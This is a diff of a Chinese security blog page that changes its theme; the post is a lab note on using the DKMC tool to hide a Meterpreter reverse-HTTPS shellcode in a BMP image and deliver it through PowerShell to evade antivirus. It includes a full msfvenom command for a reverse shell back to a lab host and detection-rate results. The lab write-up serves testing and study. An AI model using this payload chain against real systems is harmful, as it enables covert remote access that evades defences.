@@ -1,68 +1,126 @@
-
-<!DOCTYPE html>
-<html lang="zh-Hans" class="loading">
+<!doctype html>
+<html lang="zh-CN">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>免杀实验笔记之DKMC - Sec H</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="渗透测试,"> 
-    <meta name="description" content="工具的流程1、先用msf生成raw文件2、利用sc选项将raw文件转换为shellcode3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像4、利⽤ps选项⽣成基于powershel,"> 
-    <meta name="author" content="Sec H"> 
-    <link rel="alternative" href="atom.xml" title="Sec H" type="application/atom+xml"> 
-    <link rel="icon" href="/img/gao.ico"> 
+    <meta charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8" >
+    <meta name="baidu-site-verification" content="dIcXMeY8Ya" />
     
-    
-<link rel="stylesheet" href="/css/diaspora.css">
+    <title>免杀实验笔记之DKMC | Sec H</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" >
+    <meta name="keywords" content="Jelon, 前端, Web, 张德龙, 前端开发" >
+    <meta name="description" content="Jelon个人前端小站" >
 
-	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-    <script>
-         (adsbygoogle = window.adsbygoogle || []).push({
-              google_ad_client: "ca-pub-8691406134231910",
-              enable_page_level_ads: true
-         });
-    </script>
-    <script async custom-element="amp-auto-ads"
-        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
-    </script>
+    
+    <link rel="alternative" href="/atom.xml" title="Sec H" type="application/atom+xml" >
+    
+    
+    <link rel="shortcut icon" href="/favicon.ico" >
+    
+    
+<link rel="stylesheet" href="/css/style.css?v=1610591855199.css">
+
+    <!--[if lt IE 9]>
+    
+<script src="/js/html5.js"></script>
+
+    <![endif]-->
+    
+
 <meta name="generator" content="Hexo 5.3.0"></head>
 
-<body class="loading">
-    <span id="config-title" style="display:none">Sec H</span>
-    <div id="loader"></div>
-    <div id="single">
-    <div id="top" style="display: block;">
-    <div class="bar" style="width: 0;"></div>
-    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://givemefivw.github.io"></a>
-    <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">免杀实验笔记之DKMC</h3>
-    <div class="social">
-        <div>
-            <div class="share">
-                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
-            </div>
-            <div id="qr"></div>
-        </div>
+<body class="home">
+    <!--[if lt IE 9]>
+    <div class="browsehappy">
+        当前网页 <strong>不支持</strong>
+        你正在使用的浏览器. 为了正常的访问, 请 <a target="_blank" rel="noopener" href="http://browsehappy.com/">升级你的浏览器</a>.
     </div>
-    <div class="scrollbar"></div>
-</div>
+    <![endif]-->
 
-    <div class="section">
-        <div class="article">
-    <div class='main'>
-        <h1 class="title">免杀实验笔记之DKMC</h1>
-        <div class="stuff">
-            <span>十二月 23, 2020</span>
-            
-  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" rel="tag">免杀实验笔记</a></li></ul>
-
-
+    <!-- 博客头部 -->
+    <header class="header">
+    <section class="container header-main">
+        <div class="logo">
+            <a href="/">
+                <div class="cover">
+                    <span class="name">Sec H</span>
+                    <span class="description">Welcom to My Blog :)</span>
+                </div>
+            </a>
         </div>
-        <div class="content markdown">
-            <h2 id="工具的流程"><a href="#工具的流程" class="headerlink" title="工具的流程"></a>工具的流程</h2><h4 id="1、先用msf生成raw文件"><a href="#1、先用msf生成raw文件" class="headerlink" title="1、先用msf生成raw文件"></a>1、先用msf生成raw文件</h4><h4 id="2、利用sc选项将raw文件转换为shellcode"><a href="#2、利用sc选项将raw文件转换为shellcode" class="headerlink" title="2、利用sc选项将raw文件转换为shellcode"></a>2、利用sc选项将raw文件转换为shellcode</h4><h4 id="3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像"><a href="#3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像" class="headerlink" title="3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像"></a>3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像</h4><h4 id="4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload"><a href="#4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload" class="headerlink" title="4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload"></a>4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload</h4><h4 id="5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件"><a href="#5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件" class="headerlink" title="5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件"></a>5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件</h4><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h4 id="1、生成raw文件"><a href="#1、生成raw文件" class="headerlink" title="1、生成raw文件"></a>1、生成raw文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_https LHOST&#x3D;192.168.70.133 LPORT&#x3D;2233 -e x86&#x2F;shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 -f raw -o &#x2F;root&#x2F;anti-payload&#x2F;dkmc_test.raw</span><br></pre></td></tr></table></figure>
+        <div class="dropnav icon-paragraph-justify" id="JELON__btnDropNav"></div>
+        <ul class="menu hidden" id="JELON__menu">
+            
+            <li rel="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/index.html" class="item ">
+                <a href="/" title="首页" class="icon-home">&nbsp;首页</a>
+            </li>
+            
+            <li rel="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/index.html" class="item ">
+                <a href="/lab/" title="实验室" class="icon-lab">&nbsp;实验室</a>
+            </li>
+            
+            <li rel="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/index.html" class="item ">
+                <a href="/about/" title="关于" class="icon-about">&nbsp;关于</a>
+            </li>
+            
+            <li rel="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/index.html" class="item ">
+                <a href="/comment/" title="留言" class="icon-comment">&nbsp;留言</a>
+            </li>
+            
+        </ul>
+        <div class="profile clearfix">
+            <div class="feeds fl">
+                
+                
+                <p class="links">
+                    
+                        <a href="https://github.com/jangdelong" target="_blank">Github</a>
+                        |
+                    
+                        <a href="https://pages.coding.me" target="_blank">Hosted by Coding Pages</a>
+                        
+                    
+                </p>
+                <p class="sns">
+                    
+                        <a href="http://weibo.com/jangdelong" class="sinaweibo" target="_blank"><b>■</b> 新浪微博</a>
+                    
+                        <a href="https://juejin.im/user/3984285869282919" class="qqweibo" target="_blank"><b>■</b> 掘金</a>
+                    
+                    <a href="javascript: void(0);" class="wechat">
+                        <b>■</b>
+                        公众号
+                        <span class="popover">
+                            <img src="/img/wechat_mp.jpg" width="120" height="120" alt="我的微信订阅号">
+                            <i class="arrow"></i>
+                        </span>
+                    </a>
+                </p>
+                
+            </div>
+            <div class="avatar fr">
+                <img src="/img/jelon.jpg" alt="avatar" title="Jelon" >
+            </div>
+        </div>
+    </section>
+</header>
+
+
+    <!-- 博客正文 -->
+    <div class="container body clearfix">
+        <section class="content">
+            <div class="content-main widget">
+                <!-- 文章页 -->
+<!-- 文章 -->
+<article class="post article">
+    <header class="text-center">
+        <h3 class="post-title"><span>免杀实验笔记之DKMC</span></h3>
+    </header>
+    <p class="post-meta text-center">
+        Jelon 发表于
+        <time datetime="2020-12-23T06:50:51.000Z">2020-12-23</time>
+    </p>
+    <div id="JELON__articlePostContent" class="post-content">
+        <h2 id="工具的流程"><a href="#工具的流程" class="headerlink" title="工具的流程"></a>工具的流程</h2><h4 id="1、先用msf生成raw文件"><a href="#1、先用msf生成raw文件" class="headerlink" title="1、先用msf生成raw文件"></a>1、先用msf生成raw文件</h4><h4 id="2、利用sc选项将raw文件转换为shellcode"><a href="#2、利用sc选项将raw文件转换为shellcode" class="headerlink" title="2、利用sc选项将raw文件转换为shellcode"></a>2、利用sc选项将raw文件转换为shellcode</h4><h4 id="3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像"><a href="#3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像" class="headerlink" title="3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像"></a>3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像</h4><h4 id="4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload"><a href="#4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload" class="headerlink" title="4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload"></a>4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload</h4><h4 id="5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件"><a href="#5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件" class="headerlink" title="5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件"></a>5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件</h4><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h4 id="1、生成raw文件"><a href="#1、生成raw文件" class="headerlink" title="1、生成raw文件"></a>1、生成raw文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_https LHOST&#x3D;192.168.70.133 LPORT&#x3D;2233 -e x86&#x2F;shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 -f raw -o &#x2F;root&#x2F;anti-payload&#x2F;dkmc_test.raw</span><br></pre></td></tr></table></figure>
 <p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/1.png"></p>
 <h4 id="2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode"><a href="#2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode" class="headerlink" title="2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode"></a>2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode</h4><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/2.png"></p>
 <h4 id="3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像"><a href="#3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像" class="headerlink" title="3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像"></a>3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像</h4><p><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/3.png"></p>
@@ -73,116 +131,162 @@
 <h3 id="查杀率"><a href="#查杀率" class="headerlink" title="查杀率"></a>查杀率</h3><p>ps脚本的查杀率(12/60)<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/7.png"><br>bmp图像的查杀率(2/36)<br><img src="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BDKMC/8.png"></p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>DKMC主要是把shellcode注入到bmp图像中，然后使用powershell执行其中的shellcode，由于很多杀软都会监测powershell的行为，所以实际中不容易利用。</p>
 
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
-            
-                <ul id="audio-list" style="display:none">
-                    
-                        
-                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
-                        
-                    
-                        
-                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
-                        
-                    
-                </ul>
-            
-        </div>
-        
-    <div id='gitalk-container' class="comment link"
-		data-enable='false'
-        data-ae='false'
-        data-ci=''
-        data-cs=''
-        data-r=''
-        data-o=''
-        data-a=''
-        data-d='false'
-    >查看评论</div>
-
-
     </div>
+    <p class="eof">-- EOF --</p>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            
+        </span>
+        <span class="post-tags">
+            标签：
+            
     
-        <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">工具的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%85%88%E7%94%A8msf%E7%94%9F%E6%88%90raw%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.1.</span> <span class="toc-text">1、先用msf生成raw文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8sc%E9%80%89%E9%A1%B9%E5%B0%86raw%E6%96%87%E4%BB%B6%E8%BD%AC%E6%8D%A2%E4%B8%BAshellcode"><span class="toc-number">1.0.2.</span> <span class="toc-text">2、利用sc选项将raw文件转换为shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%88%A9%E2%BD%A4gen%E9%80%89%E9%A1%B9%E5%B0%86%E4%B8%8A%E2%BC%80%E6%AD%A5%E7%9A%84shellcode%E6%B3%A8%E2%BC%8A%E5%88%B0%E2%BC%80%E4%B8%AABMP%E5%9B%BE%E5%83%8F"><span class="toc-number">1.0.3.</span> <span class="toc-text">3、利⽤gen选项将上⼀步的shellcode注⼊到⼀个BMP图像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%88%A9%E2%BD%A4ps%E9%80%89%E9%A1%B9%E2%BD%A3%E6%88%90%E5%9F%BA%E4%BA%8Epowershell%E7%9A%84BMP%E2%BD%82%E4%BB%B6%E7%9A%84payload"><span class="toc-number">1.0.4.</span> <span class="toc-text">4、利⽤ps选项⽣成基于powershell的BMP⽂件的payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%88%A9%E2%BD%A4web%E9%80%89%E9%A1%B9%E6%8F%90%E4%BE%9B%E7%9A%84%E7%AE%80%E5%8D%95web%E6%9C%8D%E5%8A%A1%E8%BF%9B%E2%BE%8F%E5%88%86%E5%8F%91BMP%E2%BD%82%E4%BB%B6"><span class="toc-number">1.0.5.</span> <span class="toc-text">5、利⽤web选项提供的简单web服务进⾏分发BMP⽂件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-number">2.</span> <span class="toc-text">具体操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%94%9F%E6%88%90raw%E6%96%87%E4%BB%B6"><span class="toc-number">2.0.1.</span> <span class="toc-text">1、生成raw文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E9%80%89%E6%8B%A9Sc%E9%80%89%E9%A1%B9%EF%BC%8C%E8%AE%BE%E7%BD%AEsoure%E8%B7%AF%E5%BE%84%E4%B8%BA%E7%94%9F%E6%88%90%E7%9A%84raw%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%89%A7%E8%A1%8Crun%E7%94%9F%E6%88%90shellcode"><span class="toc-number">2.0.2.</span> <span class="toc-text">2、选择Sc选项，设置soure路径为生成的raw文件路径，执行run生成shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%A4%8D%E5%88%B6%E7%94%9F%E6%88%90%E7%9A%84shellcode%EF%BC%8C%E9%80%80%E5%9B%9E%E4%B8%BB%E8%8F%9C%E5%8D%95%EF%BC%8C%E9%80%89%E6%8B%A9gen%E9%80%89%E9%A1%B9%EF%BC%8C%E8%AE%BE%E7%BD%AEshellcode%E4%B8%BA%E7%94%9F%E6%88%90%E7%9A%84shellcode%EF%BC%8C%E5%85%B6%E4%BB%96%E9%BB%98%E8%AE%A4%EF%BC%8Crun%E7%94%9F%E6%88%90%E5%9B%BE%E5%83%8F"><span class="toc-number">2.0.3.</span> <span class="toc-text">3、复制生成的shellcode，退回主菜单，选择gen选项，设置shellcode为生成的shellcode，其他默认，run生成图像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E9%80%80%E5%9B%9E%E4%B8%BB%E8%8F%9C%E5%8D%95%EF%BC%8C%E9%80%89%E6%8B%A9ps%E9%80%89%E9%A1%B9%EF%BC%8C%E8%AE%BE%E7%BD%AEurl%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%B0%B1%E6%98%AFweb%E5%88%86%E5%8F%91%E5%9B%BE%E5%83%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%86%8D%E6%89%A7%E8%A1%8Crun%E7%94%9F%E6%88%90powershell%E8%84%9A%E6%9C%AC"><span class="toc-number">2.0.4.</span> <span class="toc-text">4、退回主菜单，选择ps选项，设置url地址，就是web分发图像文件的地址，再执行run生成powershell脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%A4%8D%E5%88%B6%E4%B8%8Bpowershell%E8%84%9A%E6%9C%AC%EF%BC%8C%E9%80%80%E5%9B%9E%E4%B8%BB%E8%8F%9C%E5%8D%95%EF%BC%8C%E9%80%89%E6%8B%A9web%E9%80%89%E9%A1%B9%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A380%EF%BC%8C%E6%89%A7%E8%A1%8Crun"><span class="toc-number">2.0.5.</span> <span class="toc-text">5、复制下powershell脚本，退回主菜单，选择web选项，默认端口80，执行run</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E7%8E%87"><span class="toc-number">2.1.</span> <span class="toc-text">查杀率</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">2.2.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>	
-        </div>
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+  <div class="article-share clearfix text-center">
+    <div class="share-area">
+      <span class="share-txt">分享到：</span>
+      <a href="javascript: window.open('http://service.weibo.com/share/share.php?url=' + encodeURIComponent(location.href) + '&title=' + document.title + '&language=zh_cn');" class="share-icon weibo"></a>
+      <a href="javascript: alert('请复制链接到微信并发送');" class="share-icon wechat"></a>
+      <a href="javascript: window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=' + encodeURIComponent(location.href) + '&title=' + document.title);" class="share-icon qqzone"></a>
+      <a href="javascript: window.open('http://connect.qq.com/widget/shareqq/index.html?url=' + encodeURIComponent(location.href) + '&desc=Jelon个人博客&title=' + document.title + '&callback=' + encodeURIComponent(location.href));" class="share-icon qq"></a>
+      <a href="javascript: window.open('http://shuo.douban.com/!service/share?href=' + encodeURIComponent(location.href) + '&name=' + document.title + '&text=' + document.title);" class="share-icon douban"></a>
+    </div>
+  </div>
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br >
+        <a href="/2020/12/23/CVE-2020-11991%20Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9EPOC/">
+            
+                CVE-2020-11991 Apache Cocoon XML 外部实体注入漏洞POC
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br >
+        <a href="/2020/12/23/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0%E4%B9%8BVeil/">
+            
+                免杀实验笔记之Veil
+            
+        </a>
+    </span>
     
 </div>
 
+<!-- 文章评论 -->
 
-    </div>
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章搜索</strong></h3>
+        <div class="search-form">
+  <form
+    id="searchForm"
+    method="GET"
+    action="https://www.baidu.com/s"
+    ectype="application/x-www-form-urlencoded"
+    target="_blank"
+    autocomplete="false"
+    onsubmit="javascript: return false;">
+    <input
+      id="searchKeyword"
+      type="text"
+      class="form-control"
+      placeholder="输入关键字搜索"
+      autocomplete="false"
+    />
+    <input id="searchKeywordHidden" type="hidden" name="wd" />
+    <input id="searchButton" class="btn" type="submit" value="搜索" />
+  </form>
 </div>
+    </section>
+    
+
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/%E5%A4%8D%E7%8E%B0/" title="复现">复现 (4)</a>
+  
+    <a class="tag-item" href="/tags/POC/" title="POC">POC (7)</a>
+  
+    <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (5)</a>
+  
+    <a class="tag-item" href="/tags/%E7%AC%94%E8%AE%B0/" title="笔记">笔记 (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://github.com/front-end-pigs/blog" target="_blank" title="Github博客">Github博客</a>
+        </li>
+    
+        <li>
+            <a href="https://jelon.info" target="_blank" title="Jelon博客">Jelon博客</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2021
+    
+
+    <a href="/">Jelon Loves You</a>
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+
+<script src="/js/main.js?v=1610591855200.js"></script>
+
+
 </body>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-
-
 </html>
